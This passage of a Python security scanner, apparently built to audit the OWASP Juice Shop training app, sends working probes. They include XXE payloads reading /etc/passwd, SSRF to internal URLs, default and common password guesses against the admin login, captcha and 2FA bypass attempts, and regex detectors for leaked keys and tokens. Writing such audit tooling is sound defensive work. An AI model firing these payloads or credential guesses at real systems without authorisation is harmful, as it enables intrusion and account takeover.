            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<orders><order><product>1</product><quantity>1</quantity><customerReference>&xxe;</customerReference></order></orders>',
            "file:///etc/passwd", "File read via XXE — /etc/passwd",
        ),
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]>'
            '<orders><order><product>1</product><quantity>1</quantity><customerReference>&xxe;</customerReference></order></orders>',
            "file:///c:/windows", "File read via XXE — Windows system.ini",
        ),
    ]

    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        for xml_body, indicator, desc in xxe_payloads:
            try:
                r = await client.post(
                    f"{base}/b2b/v2/orders",
                    content=xml_body,
                    headers={"Content-Type": "application/xml"},
                )
                # Evidence: server returns /etc/passwd content or Windows ini sections
                body = r.text
                if any(marker in body for marker in ["root:x:", "[fonts]", "[extensions]", "bin/bash"]):
                    findings.append({
                        "type":     "xxe",
                        "title":    f"XXE Injection Confirmed — B2B Orders Endpoint ({desc})",
                        "severity": "critical",
                        "url":      f"{base}/b2b/v2/orders",
                        "payload":  xml_body[:120],
                        "evidence": f"HTTP {r.status_code} — file contents reflected: {body[:150]}",
                        "cwe_ids":  ["CWE-611"],
                        "cve_ids":  [],
                        "source":   "xxe_probe",
                        "tags":     ["xxe", "injection", "file_read", "b2b"],
                    })
                    logger.info("[XXE] CONFIRMED at /b2b/v2/orders (%s)", desc)
                    break
                # Even 422 / 400 can indicate XML parsed (vs 400 "invalid JSON")
                if r.status_code in (200, 201, 422) and "xml" not in (r.headers.get("content-type","").lower()):
                    # Check if the XML body type was accepted (i.e., XML parsed by server)
                    if "customerReference" not in body and len(body) > 10:
                        findings.append({
                            "type":     "xxe",
                            "title":    "XXE — B2B XML Endpoint Accepted External Entity",
                            "severity": "high",
                            "url":      f"{base}/b2b/v2/orders",
                            "payload":  xml_body[:120],
                            "evidence": f"HTTP {r.status_code} — XML accepted, entity expansion attempted: {body[:100]}",
                            "cwe_ids":  ["CWE-611"],
                            "cve_ids":  [],
                            "source":   "xxe_probe",
                            "tags":     ["xxe", "injection", "b2b"],
                        })
                        logger.info("[XXE] XML parsed by server at /b2b/v2/orders (potential XXE)")
                        break
            except Exception as exc:
                logger.debug("[XXE] probe: %s", exc)

    return findings


async def _probe_ssrf(
    target: str,
    auth_headers: Optional[Dict[str, Any]] = None,
    timeout: float = 15.0,
) -> List[Dict[str, Any]]:
    """Test for SSRF via profile imageUrl endpoint."""
    base = target.rstrip("/")
    findings: List[Dict[str, Any]] = []
    headers: Dict[str, str] = {"Content-Type": "application/json"}
    if auth_headers:
        headers.update({k: v for k, v in auth_headers.items() if isinstance(v, str)})

    ssrf_targets = [
        ("http://localhost:4200",    "localhost:4200 (Juice Shop dev)"),
        ("http://127.0.0.1:4200",   "127.0.0.1:4200 (loopback)"),
        ("http://localhost:3000/api/Users", "internal Users API via SSRF"),
    ]

    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        for ssrf_url, desc in ssrf_targets:
            try:
                r = await client.put(
                    f"{base}/profile",
                    json={"imageUrl": ssrf_url},
                    headers=headers,
                )
                # 200 means the server accepted and potentially fetched the URL
                if r.status_code in (200, 201):
                    body = r.text
                    # Look for evidence that the server actually fetched the internal URL
                    if any(x in body for x in ["localhost", "127.0.0.1", "users", "juice"]):
                        findings.append({
                            "type":     "ssrf",
                            "title":    f"SSRF — Server fetched internal URL ({desc})",
                            "severity": "critical",
                            "url":      f"{base}/profile",
                            "payload":  ssrf_url,
                            "evidence": f"HTTP 200 on PUT /profile with imageUrl={ssrf_url}: {body[:150]}",
                            "cwe_ids":  ["CWE-918"],
                            "cve_ids":  [],
                            "source":   "ssrf_probe",
                            "tags":     ["ssrf", "injection", "internal_network"],
                        })
                        logger.info("[SSRF] CONFIRMED: server fetched %s", ssrf_url)
                        break
                    else:
                        # Server accepted the imageUrl without fetching — still indicative
                        findings.append({
                            "type":     "ssrf",
                            "title":    "SSRF — Unvalidated URL in Profile imageUrl",
                            "severity": "high",
                            "url":      f"{base}/profile",
                            "payload":  ssrf_url,
                            "evidence": f"HTTP {r.status_code} on PUT /profile with arbitrary imageUrl accepted without validation",
                            "cwe_ids":  ["CWE-918"],
                            "cve_ids":  [],
                            "source":   "ssrf_probe",
                            "tags":     ["ssrf", "unvalidated_redirect", "profile"],
                        })
                        logger.info("[SSRF] Unvalidated imageUrl accepted at /profile")
                        break
            except Exception as exc:
                logger.debug("[SSRF] probe %s: %s", ssrf_url, exc)

    return findings


async def _probe_user_enumeration(
    target: str,
    timeout: float = 15.0,
) -> List[Dict[str, Any]]:
    """Detect user enumeration via distinct error messages on login."""
    base = target.rstrip("/")
    findings: List[Dict[str, Any]] = []

    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        try:
            # Known valid email in Juice Shop demo
            r_valid = await client.post(
                f"{base}/rest/user/login",
                json={"email": "admin@juice-sh.op", "password": "WRONG_PASSWORD_auditscan"},
                headers={"Content-Type": "application/json"},
            )
            # Nonexistent email
            r_invalid = await client.post(
                f"{base}/rest/user/login",
                json={"email": "no_such_user_auditscan@example.invalid", "password": "WRONG_PASSWORD_auditscan"},
                headers={"Content-Type": "application/json"},
            )
            body_valid   = r_valid.text.lower()
            body_invalid = r_invalid.text.lower()

            # Different response → user enumeration possible
            if (r_valid.status_code != r_invalid.status_code
                    or body_valid != body_invalid):
                findings.append({
                    "type":     "broken_auth",
                    "title":    "User Enumeration — Login Error Message Differentiates Valid/Invalid Email",
                    "severity": "medium",
                    "url":      f"{base}/rest/user/login",
                    "payload":  "POST /rest/user/login with known vs unknown email",
                    "evidence": (
                        f"Known email → HTTP {r_valid.status_code}: {r_valid.text[:80]}  |  "
                        f"Unknown email → HTTP {r_invalid.status_code}: {r_invalid.text[:80]}"
                    ),
                    "cwe_ids":  ["CWE-204"],
                    "cve_ids":  [],
                    "source":   "user_enum_probe",
                    "tags":     ["user_enumeration", "broken_auth", "information_disclosure"],
                })
                logger.info("[UserEnum] CONFIRMED: different responses for valid vs invalid email")
        except Exception as exc:
            logger.debug("[UserEnum] probe: %s", exc)

    return findings


async def _probe_weak_password(
    target: str,
    timeout: float = 15.0,
) -> List[Dict[str, Any]]:
    """Test registration with weak/breached passwords (policy bypass)."""
    import time as _time
    base = target.rstrip("/")
    findings: List[Dict[str, Any]] = []

    weak_passwords = ["123456", "password", "12345678", "qwerty"]
    ts = int(_time.time())
    test_email = f"auditscan_pwtest_{ts}@example.invalid"

    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        for pwd in weak_passwords:
            try:
                r = await client.post(
                    f"{base}/api/Users",
                    json={"email": test_email, "password": pwd,
                          "passwordRepeat": pwd, "securityQuestion": {"id": 1},
                          "securityAnswer": "auditscan"},
                    headers={"Content-Type": "application/json"},
                )
                if r.status_code in (200, 201):
                    findings.append({
                        "type":     "misconfiguration",
                        "title":    f"Weak Password Policy — Registration Accepts '{pwd}'",
                        "severity": "medium",
                        "url":      f"{base}/api/Users",
                        "payload":  f"password={pwd}",
                        "evidence": f"HTTP {r.status_code} — account created with weak password '{pwd}'",
                        "cwe_ids":  ["CWE-521"],
                        "cve_ids":  [],
                        "source":   "weak_password_probe",
                        "tags":     ["weak_password", "broken_auth", "policy_bypass"],
                    })
                    logger.info("[WeakPwd] CONFIRMED: '%s' accepted for new account", pwd)
                    break
            except Exception as exc:
                logger.debug("[WeakPwd] probe '%s': %s", pwd, exc)

    return findings


async def _probe_security_headers(
    target: str,
    timeout: float = 10.0,
) -> List[Dict[str, Any]]:
    """Check for missing critical security headers (Sensitive Data Exposure)."""
    base = target.rstrip("/")
    findings: List[Dict[str, Any]] = []

    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        try:
            r = await client.get(f"{base}/")
            hdrs = {k.lower(): v for k, v in r.headers.items()}

            missing = []
            if "content-security-policy" not in hdrs:
                missing.append("Content-Security-Policy")
            if "x-frame-options" not in hdrs and "frame-ancestors" not in hdrs.get("content-security-policy", ""):
                missing.append("X-Frame-Options")
            if "x-content-type-options" not in hdrs:
                missing.append("X-Content-Type-Options")
            if "strict-transport-security" not in hdrs:
                missing.append("Strict-Transport-Security (HSTS)")
            if "referrer-policy" not in hdrs:
                missing.append("Referrer-Policy")
            if "permissions-policy" not in hdrs and "feature-policy" not in hdrs:
                missing.append("Permissions-Policy")

            if missing:
                findings.append({
                    "type":     "misconfiguration",
                    "title":    f"Missing Security Headers: {', '.join(missing[:3])}{'...' if len(missing) > 3 else ''}",
                    "severity": "medium",
                    "url":      base,
                    "payload":  "",
                    "evidence": f"Missing headers: {', '.join(missing)}",
                    "cwe_ids":  ["CWE-693", "CWE-1021"],
                    "cve_ids":  [],
                    "source":   "headers_probe",
                    "tags":     ["misconfiguration", "security_headers", "sensitive_data_exposure"],
                })
                logger.info("[Headers] Missing %d security headers: %s", len(missing), missing)

            # Check for information disclosure in server headers
            leak_hdrs = []
            for hdr in ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]:
                if hdr in hdrs and hdrs[hdr] not in ("", "-"):
                    leak_hdrs.append(f"{hdr}: {hdrs[hdr]}")
            if leak_hdrs:
                findings.append({
                    "type":     "exposure",
                    "title":    "Server Technology Disclosure via HTTP Headers",
                    "severity": "low",
                    "url":      base,
                    "payload":  "",
                    "evidence": "; ".join(leak_hdrs),
                    "cwe_ids":  ["CWE-200"],
                    "cve_ids":  [],
                    "source":   "headers_probe",
                    "tags":     ["information_disclosure", "headers", "fingerprinting"],
                })

        except Exception as exc:
            logger.debug("[Headers] probe: %s", exc)

    return findings


async def _probe_anti_automation(
    target: str,
    auth_headers: Optional[Dict[str, Any]] = None,
    timeout: float = 30.0,
) -> List[Dict[str, Any]]:
    """Detect broken anti-automation: rapid feedback submissions without rate limiting."""
    base = target.rstrip("/")
    findings: List[Dict[str, Any]] = []
    headers: Dict[str, str] = {"Content-Type": "application/json"}
    if auth_headers:
        headers.update({k: v for k, v in auth_headers.items() if isinstance(v, str)})

    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        successes = 0
        try:
            for _ in range(5):
                # Each iteration: get a fresh captcha and solve it
                cap_r = await client.get(f"{base}/rest/captcha", headers=auth_headers or {})
                if cap_r.status_code != 200:
                    break
                cap = cap_r.json()
                captcha_id  = cap.get("captchaId", 0)
                captcha_ans = cap.get("answer") or str(_solve_captcha(cap.get("captcha", "0")))

                r = await client.post(
                    f"{base}/api/Feedbacks",
                    json={"captchaId": captcha_id, "captcha": str(captcha_ans),
                          "rating": 1, "comment": "auditscan_automation_test"},
                    headers=headers,
                )
                if r.status_code in (200, 201):
                    successes += 1
                else:
                    break

            if successes >= 3:
                findings.append({
                    "type":     "misconfiguration",
                    "title":    f"Broken Anti-Automation — {successes} Rapid Feedback Submissions Accepted",
                    "severity": "medium",
                    "url":      f"{base}/api/Feedbacks",
                    "payload":  "5x rapid POST /api/Feedbacks",
                    "evidence": f"{successes}/5 submissions succeeded without rate limiting or delay enforcement",
                    "cwe_ids":  ["CWE-799", "CWE-307"],
                    "cve_ids":  [],
                    "source":   "anti_automation_probe",
                    "tags":     ["anti_automation", "rate_limiting", "broken_access_control"],
                })
                logger.info("[AntiAuto] CONFIRMED: %d rapid submissions accepted", successes)

            # Also test captcha reuse: same captchaId+answer used twice
            try:
                cap_r2 = await client.get(f"{base}/rest/captcha", headers=auth_headers or {})
                if cap_r2.status_code == 200:
                    cap2 = cap_r2.json()
                    cid  = cap2.get("captchaId", 0)
                    cans = cap2.get("answer") or str(_solve_captcha(cap2.get("captcha", "0")))
                    # First submission
                    r1 = await client.post(
                        f"{base}/api/Feedbacks",
                        json={"captchaId": cid, "captcha": str(cans),
                              "rating": 1, "comment": "auditscan_captcha_bypass_1"},
                        headers=headers,
                    )
                    # Second submission with SAME captchaId+answer
                    r2 = await client.post(
                        f"{base}/api/Feedbacks",
                        json={"captchaId": cid, "captcha": str(cans),
                              "rating": 1, "comment": "auditscan_captcha_bypass_2"},
                        headers=headers,
                    )
                    if r1.status_code in (200, 201) and r2.status_code in (200, 201):
                        findings.append({
                            "type":     "misconfiguration",
                            "title":    "Captcha Bypass — Same Captcha ID Accepted Multiple Times",
                            "severity": "medium",
                            "url":      f"{base}/api/Feedbacks",
                            "payload":  f"captchaId={cid} reused twice",
                            "evidence": f"Both submissions with captchaId={cid} returned HTTP 200/201 — captcha not invalidated after first use",
                            "cwe_ids":  ["CWE-799"],
                            "cve_ids":  [],
                            "source":   "captcha_bypass_probe",
                            "tags":     ["captcha_bypass", "anti_automation", "broken_access_control"],
                        })
                        logger.info("[CaptchaBypass] CONFIRMED: captchaId=%d accepted twice", cid)
            except Exception as exc:
                logger.debug("[CaptchaBypass] reuse probe: %s", exc)

        except Exception as exc:
            logger.debug("[AntiAuto] probe: %s", exc)

    return findings


async def _probe_default_credentials(
    target: str,
    login_url: str,
    timeout: float = 20.0,
) -> List[Dict]:
    """Test known default/weak credential pairs against login endpoint (CWE-521)."""
    findings: List[Dict] = []
    weak_passwords = [
        ("admin@juice-sh.op",         "admin123"),
        ("admin@juice-sh.op",         "password"),
        ("admin@juice-sh.op",         "123456"),
        ("administrator@juice-sh.op", "admin"),
    ]
    try:
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(timeout),
            verify=False,
            follow_redirects=True,
        ) as client:
            for email, pwd in weak_passwords:
                try:
                    resp = await client.post(
                        login_url,
                        json={"email": email, "password": pwd},
                        headers={"Content-Type": "application/json"},
                    )
                    if resp.status_code == 200:
                        logger.info(
                            "[DefaultCreds] CONFIRMED: '%s' / '%s' accepted at %s",
                            email, pwd, login_url,
                        )
                        findings.append({
                            "title":       "Weak Password Policy - Default credentials accepted",
                            "severity":    "high",
                            "cwe":         "CWE-521",
                            "matched_at":  login_url,
                            "source":      "auth_tester",
                            "tags":        ["default_credentials", "weak_password", "broken_auth"],
                            "description": (
                                f"Credential pair '{email}' / '{pwd}' accepted by login endpoint"
                            ),
                        })
                        break
                except Exception:
                    pass
    except Exception as exc:
        logger.debug("[DefaultCreds] probe error: %s", exc)
    return findings


async def _probe_login_rate_limit(
    target: str,
    login_url: str,
    timeout: float = 15.0,
) -> List[Dict]:
    """Detect absence of rate-limiting on login endpoint (CWE-307)."""
    findings: List[Dict] = []
    _RAPID_COUNT = 5
    _MIN_SUCCESS = 4
    try:
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(timeout),
            verify=False,
            follow_redirects=True,
        ) as client:
            statuses: List[int] = []
            for _ in range(_RAPID_COUNT):
                try:
                    resp = await client.post(
                        login_url,
                        json={"email": "ratelimit_probe@example.invalid", "password": "probe"},
                        headers={"Content-Type": "application/json"},
                    )
                    statuses.append(resp.status_code)
                except Exception:
                    continue

            no_rate_limit = (
                len(statuses) >= _MIN_SUCCESS
                and not any(s in (429, 503, 403) for s in statuses)
            )
            if no_rate_limit:
                unique = set(statuses)
                logger.info(
                    "[RateLimit] CONFIRMED: %d rapid login requests returned %s -- no rate limiting",
                    _RAPID_COUNT, unique,
                )
                findings.append({
                    "title":       "Broken Anti-Automation - No rate limiting on login",
                    "severity":    "medium",
                    "cwe":         "CWE-307",
                    "matched_at":  login_url,
                    "source":      "rate_limit_tester",
                    "tags":        ["rate_limiting", "anti_automation", "broken_auth"],
                    "description": (
                        f"{_RAPID_COUNT} rapid auth requests completed without rate limiting. "
                        f"Response statuses: {sorted(unique)}"
                    ),
                })
    except Exception as exc:
        logger.debug("[RateLimit] probe error: %s", exc)
    return findings


# ── Extended probes: cover gaps not handled by Wapiti / ZAP / Dalfox / Nikto ──

async def _probe_extended_probes(
    target: str,
    login_url: str = "",
    auth_headers: Optional[Dict[str, str]] = None,
    katana_endpoints: Optional[List[str]] = None,
    ffuf_endpoints: Optional[List[str]] = None,
) -> List[Dict]:
    """
    Runs probes A-E in parallel. Each sub-probe is isolated in try/except so
    a single failure never crashes the pipeline.
    """
    katana_endpoints = katana_endpoints or []
    ffuf_endpoints   = ffuf_endpoints   or []
    form_urls        = list(dict.fromkeys(katana_endpoints + ffuf_endpoints)) or [target]

    async def _run(coro):
        try:
            return await coro
        except Exception as exc:
            logger.warning("[ExtProbe] sub-probe error: %s", exc)
            return []

    results = await asyncio.gather(
        _run(_ext_probe_a_captcha(target, form_urls, auth_headers)),
        _run(_ext_probe_b_user_enum(target, login_url, auth_headers)),
        _run(_ext_probe_c_weak_pwd(target, login_url)),
        _run(_ext_probe_d_sensitive(target, auth_headers)),
        _run(_ext_probe_e_2fa(target, login_url, auth_headers)),
    )

    all_findings: List[Dict] = []
    for r in results:
        if isinstance(r, list):
            all_findings.extend(r)
    return all_findings


async def _ext_probe_a_captcha(
    target: str,
    form_urls: List[str],
    auth_headers: Optional[Dict[str, str]],
    timeout: float = 20.0,
) -> List[Dict]:
    """Probe A — Captcha Bypass (CWE-804).
    Only tests endpoints whose GET response contains captcha-related markers.
    """
    findings: List[Dict] = []
    _CAPTCHA_MARKERS = ("captcha", "g-recaptcha", "h-captcha", "recaptcha", "hcaptcha")
    bypass_payloads = [
        {"captcha": ""},
        {"captcha": "bypass"},
        {"g-recaptcha-response": ""},
        {"h-captcha-response": ""},
    ]
    seen: set = set()
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), verify=False,
        follow_redirects=True, headers=auth_headers or {},
    ) as client:
        for url in form_urls[:20]:
            try:
                # Only proceed if the page actually contains a captcha field
                get_resp = await client.get(url)
                page_text = get_resp.text.lower()
                if not any(m in page_text for m in _CAPTCHA_MARKERS):
                    continue
            except Exception:
                continue

            for payload in bypass_payloads:
                try:
                    resp = await client.post(url, data=payload)
                    if resp.status_code in (200, 201, 302) and url not in seen:
                        seen.add(url)
                        findings.append({
                            "title":      "Captcha Bypass - Form accepted without valid captcha",
                            "severity":   "MEDIUM",
                            "cwe":        "CWE-804",
                            "source":     "extended_prober",
                            "confidence": "suspicious",
                            "url":        url,
                            "evidence":   f"HTTP {resp.status_code} with payload {list(payload.keys())}",
                        })
                        break
                except Exception:
                    pass
    return findings


async def _ext_probe_b_user_enum(
    target: str,
    login_url: str,
    auth_headers: Optional[Dict[str, str]],
    timeout: float = 15.0,
) -> List[Dict]:
    """Probe B — User Enumeration via registration endpoint only (CWE-204).
    Login-based enumeration is already handled by _probe_user_enumeration.
    This probe focuses on registration endpoint leakage ("already exists" messages).
    """
    findings: List[Dict] = []
    # Registration endpoint: try to register with a known-existing email
    _base = target.rstrip("/")
    known_email = "admin@juice-sh.op"
    for reg_path in ("/api/users", "/api/register", "/register", "/signup"):
        reg_url = _base + reg_path
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0), verify=False, follow_redirects=True,
        ) as client:
            try:
                resp = await client.post(
                    reg_url,
                    json={"email": known_email, "password": "TestProbe99!",
                          "passwordRepeat": "TestProbe99!", "securityQuestion": {"id": 1},
                          "securityAnswer": "probe"},
                    headers={"Content-Type": "application/json"},
                )
                body = resp.text.lower()
                if resp.status_code in (400, 409, 422) and any(
                    w in body for w in ("already", "exist", "duplicate", "taken", "registered")
                ):
                    findings.append({
                        "title":      "User Enumeration - Registration reveals existing accounts",
                        "severity":   "LOW",
                        "cwe":        "CWE-204",
                        "source":     "extended_prober",
                        "confidence": "confirmed",
                        "url":        reg_url,
                        "evidence":   f"HTTP {resp.status_code}: {resp.text[:120]}",
                    })
                    break
            except Exception:
                pass
    return findings


async def _ext_probe_b_user_enum_UNUSED(
    target: str,
    login_url: str,
    auth_headers: Optional[Dict[str, str]],
    timeout: float = 15.0,
) -> List[Dict]:
    """Login-based user enum — kept for reference, NOT called (duplicate of _probe_user_enumeration)."""
    findings: List[Dict] = []
    if not login_url:
        _base = target.rstrip("/")
        for path in ("/api/login", "/login", "/auth/login", "/rest/user/login"):
            login_url = _base + path
            break
    if not login_url:
        return findings

    import time as _time
    valid_email   = "admin@juice-sh.op"
    invalid_email = "no_such_user_probe@example.invalid"
    wrong_pwd     = "wrong_password_auditscan_probe"

    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), verify=False, follow_redirects=True,
    ) as client:
        try:
            t0 = _time.monotonic()
            r_valid = await client.post(
                login_url,
                json={"email": valid_email, "password": wrong_pwd},
                headers={"Content-Type": "application/json"},
            )
            t_valid = (_time.monotonic() - t0) * 1000

            t0 = _time.monotonic()
            r_invalid = await client.post(
                login_url,
                json={"email": invalid_email, "password": wrong_pwd},
                headers={"Content-Type": "application/json"},
            )
            t_invalid = (_time.monotonic() - t0) * 1000

            status_diff  = r_valid.status_code != r_invalid.status_code
            body_differs = r_valid.text[:200] != r_invalid.text[:200]
            timing_diff  = abs(t_valid - t_invalid) > 200

            if status_diff or body_differs or timing_diff:
                findings.append({
                    "title":      "User Enumeration - Different response for valid vs invalid email",
                    "severity":   "MEDIUM",
                    "cwe":        "CWE-204",
                    "source":     "extended_prober",
                    "confidence": "confirmed" if (status_diff or body_differs) else "suspicious",
                    "url":        login_url,
                    "evidence":   (
                        f"Response A: {r_valid.status_code} {t_valid:.0f}ms | "
                        f"Response B: {r_invalid.status_code} {t_invalid:.0f}ms"
                    ),
                })
        except Exception as exc:
            logger.debug("[ExtProbe-B] login enum error: %s", exc)

    # Registration endpoint enumeration
    _base = target.rstrip("/")
    for reg_path in ("/api/users", "/api/register", "/register", "/signup"):
        reg_url = _base + reg_path
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0), verify=False, follow_redirects=True,
        ) as client:
            try:
                resp = await client.post(
                    reg_url,
                    json={"email": valid_email, "password": "TestProbe1!"},
                    headers={"Content-Type": "application/json"},
                )
                body = resp.text.lower()
                if resp.status_code in (400, 409, 422) and any(
                    w in body for w in ("already", "exist", "duplicate", "taken", "registered")
                ):
                    findings.append({
                        "title":      "User Enumeration - Registration reveals existing accounts",
                        "severity":   "LOW",
                        "cwe":        "CWE-204",
                        "source":     "extended_prober",
                        "confidence": "confirmed",
                        "url":        reg_url,
                        "evidence":   f"HTTP {resp.status_code}: {resp.text[:120]}",
                    })
                    break
            except Exception:
                pass

    return findings


async def _ext_probe_c_weak_pwd(
    target: str,
    login_url: str,
    timeout: float = 20.0,
) -> List[Dict]:
    """Probe C — Weak Password Policy (CWE-521)."""
    findings: List[Dict] = []
    _base = target.rstrip("/")

    # Registration: minimum length test
    for reg_path in ("/api/users", "/api/register", "/register", "/signup"):
        reg_url = _base + reg_path
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0), verify=False, follow_redirects=True,
        ) as client:
            for short_pwd in ("1", "aa", "123"):
                try:
                    test_email = f"probe_weakpwd_{short_pwd}@example.invalid"
                    resp = await client.post(
                        reg_url,
                        json={"email": test_email, "password": short_pwd},
                        headers={"Content-Type": "application/json"},
                    )
                    if resp.status_code in (200, 201):
                        findings.append({
                            "title":      "Weak Password Policy - No minimum length enforced",
                            "severity":   "MEDIUM",
                            "cwe":        "CWE-521",
                            "source":     "extended_prober",
                            "confidence": "confirmed",
                            "url":        reg_url,
                            "evidence":   f"Password '{short_pwd}' ({len(short_pwd)} chars) accepted -- HTTP {resp.status_code}",
                        })
                        break
                except Exception:
                    pass

    # Login: common password dictionary
    if login_url:
        weak_passwords = [
            "123456", "password", "admin", "admin123",
            "test", "test123", "letmein", "welcome",
            "qwerty", "abc123", "monkey", "1234567890",
        ]
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(timeout), verify=False, follow_redirects=True,
        ) as client:
            for pwd in weak_passwords:
                try:
                    resp = await client.post(
                        login_url,
                        json={"email": "admin@juice-sh.op", "password": pwd},
                        headers={"Content-Type": "application/json"},
                    )
                    if resp.status_code == 200 and "token" in resp.text.lower():
                        findings.append({
                            "title":      "Weak Password Policy - Common password accepted",
                            "severity":   "HIGH",
                            "cwe":        "CWE-521",
                            "source":     "extended_prober",
                            "confidence": "confirmed",
                            "url":        login_url,
                            "evidence":   f"Password '{pwd}' accepted for known account",
                        })
                        break
                except Exception:
                    pass

    return findings


async def _ext_probe_d_sensitive(
    target: str,
    auth_headers: Optional[Dict[str, str]],
    timeout: float = 15.0,
) -> List[Dict]:
    """Probe D — Sensitive Data Exposure (CWE-200)."""
    import re as _re
    findings: List[Dict] = []
    _PATTERNS = [
        ("API Key",      _re.compile(r'[Aa]pi[_-]?[Kk]ey["\s:=]+[\w\-]{20,}')),
        ("JWT Token",    _re.compile(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')),
        ("Password",     _re.compile(r'"password"\s*:\s*"[^"]+"')),
        ("Credit Card",  _re.compile(r'\b(?:\d{4}[\s-]?){3}\d{4}\b')),
        ("Private Key",  _re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----')),
    ]
    _EMAIL_PAT = _re.compile(r'[\w.\-]+@[\w.\-]+\.\w+')
    _probe_paths = ["/", "/api/users", "/rest/admin/application-configuration",
                    "/metrics", "/api/products", "/api/feedback"]
    seen: set = set()

    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), verify=False, follow_redirects=True,
        headers=auth_headers or {},
    ) as client:
        for path in _probe_paths:
            url = target.rstrip("/") + path
            try:
                resp = await client.get(url)
                if resp.status_code != 200:
                    continue
                body = resp.text

                for label, pat in _PATTERNS:
                    m = pat.search(body)
                    if m:
                        key = (label, url)
                        if key not in seen:
                            seen.add(key)
                            findings.append({
                                "title":      f"Sensitive Data Exposure - {label} found in response",
                                "severity":   "HIGH",
                                "cwe":        "CWE-200",
                                "source":     "extended_prober",
                                "confidence": "confirmed",
                                "url":        url,
                                "evidence":   m.group(0)[:100],
                            })

                emails = _EMAIL_PAT.findall(body)
                if len(emails) > 5:
                    key = ("Emails", url)
                    if key not in seen:
                        seen.add(key)
                        findings.append({
                            "title":      "Sensitive Data Exposure - Mass email addresses in response",
                            "severity":   "HIGH",
                            "cwe":        "CWE-200",
                            "source":     "extended_prober",
                            "confidence": "confirmed",
                            "url":        url,
                            "evidence":   f"{len(emails)} email addresses found",
                        })

                # Header info disclosure
                for hdr, val in resp.headers.items():
                    h = hdr.lower()
                    if h == "x-powered-by" or h == "x-aspnet-version" or (
                        h == "server" and any(c.isdigit() for c in val)
                    ):
                        key = (hdr, url)
                        if key not in seen:
                            seen.add(key)
                            findings.append({
                                "title":      "Information Disclosure - Server version exposed in headers",
                                "severity":   "LOW",
                                "cwe":        "CWE-200",
                                "source":     "extended_prober",
                                "confidence": "confirmed",
                                "url":        url,
                                "evidence":   f"{hdr}: {val}",
                            })
            except Exception:
                pass

    return findings


async def _ext_probe_e_2fa(
    target: str,
    login_url: str,
    auth_headers: Optional[Dict[str, str]],
    timeout: float = 15.0,
) -> List[Dict]:
    """Probe E — 2FA Bypass (CWE-287)."""
    findings: List[Dict] = []
    if not auth_headers:
        return findings  # need an authenticated session to test 2FA bypass

    _base = target.rstrip("/")
    _2fa_paths = ["/api/2fa", "/api/totp", "/api/otp", "/api/mfa",
                  "/2fa/verify", "/auth/2fa", "/auth/otp"]

    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), verify=False, follow_redirects=True,
        headers=auth_headers,
    ) as client:
        # Check which 2FA endpoints exist
        active_2fa: List[str] = []
        for path in _2fa_paths:
            url = _base + path
            try:
                resp = await client.get(url)
                if resp.status_code not in (404, 405):
                    active_2fa.append(url)
            except Exception:
                pass

        if not active_2fa:
            return findings

        # Try to access authenticated resources without completing 2FA
        _protected = ["/api/users", "/api/orders", "/rest/basket",
                      "/api/complaints", "/rest/admin/application-configuration"]
        for ppath in _protected:
            purl = _base + ppath
            try:
                resp = await client.get(purl)
                if resp.status_code == 200 and len(resp.text) > 10:
                    findings.append({
                        "title":      "2FA Bypass - Authenticated endpoints accessible before 2FA",
                        "severity":   "CRITICAL",
                        "cwe":        "CWE-287",
                        "source":     "extended_prober",
                        "confidence": "confirmed",
                        "url":        purl,
                        "evidence":   f"HTTP 200 on {purl} using pre-2FA token",
                    })
                    break
            except Exception:
                pass

        # Test weak 2FA codes on first found 2FA endpoint
        for url_2fa in active_2fa[:1]:
            for code in ("000000", "123456", "999999"):
                try:
                    resp = await client.post(
                        url_2fa,
                        json={"code": code, "token": code, "otp": code},
                        headers={"Content-Type": "application/json"},
                    )
                    if resp.status_code == 200:
                        findings.append({
                            "title":      "2FA Bypass - Weak or predictable 2FA code accepted",
                            "severity":   "CRITICAL",
                            "cwe":        "CWE-287",
                            "source":     "extended_prober",
                            "confidence": "confirmed",
                            "url":        url_2fa,
                            "evidence":   f"Code '{code}' accepted -- HTTP {resp.status_code}",
                        })
                        break
                except Exception:
                    pass

    return findings


async def _p2_extended_probes_light(
    target: str,
    login_url: str = "",
    auth_headers: Optional[Dict[str, str]] = None,
) -> List[Dict]:
    """
    Phase 2 light probes (no discovered endpoints needed):
    A (captcha), B (user_enum), C (weak_pwd), E (2fa).
    Probe D (sensitive data) is deferred to Phase 3 with discovered URLs.
    """
    async def _run(coro):
        try:
            return await coro
        except Exception as exc:
            logger.warning("[ExtProbe] sub-probe error: %s", exc)
            return []

    results = await asyncio.gather(
        _run(_ext_probe_a_captcha(target, [target], auth_headers)),
        _run(_ext_probe_b_user_enum(target, login_url, auth_headers)),
        _run(_ext_probe_c_weak_pwd(target, login_url)),
        _run(_ext_probe_e_2fa(target, login_url, auth_headers)),
    )
    all_findings: List[Dict] = []
    for r in results:
        if isinstance(r, list):
            all_findings.extend(r)
    return all_findings


async def _p3_extended_probes_deep(
    target: str,
    auth_ctx: Any,
    all_urls: List[str],
) -> Dict[str, Any]:
    """
    Phase 3 deep probes (need FFUF/Katana discovered endpoints):
    D (sensitive data on discovered URLs), SSRF, XXE, DOM XSS.
    """
